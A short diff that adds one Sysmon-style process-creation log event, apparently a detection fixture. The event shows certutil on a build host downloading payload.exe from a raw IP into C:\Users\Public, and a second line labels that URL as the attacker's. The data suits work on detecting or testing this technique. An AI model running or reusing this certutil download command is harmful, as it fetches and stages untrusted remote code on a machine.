@@ -1,0 +1,3 @@
+{"System": {"EventID": 1, "Computer": "DEV-BUILD-11", "TimeCreated": "2026-07-23T18:33:04Z"}, "EventData": {"Image": "C:\\Windows\\System32\\certutil.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "certutil -urlcache -split -f https://185.142.223.15/payload.exe C:\\Users\\Public\\p.exe", "User": "DEV\\ci_runner", "Hashes": {"SHA256": "cafebabe112233445566778899001122334455667788990011223344556677aa"}, "ProcessId": 4132}}
+
+Attacker URL: https://185.142.223.15/payload.exe
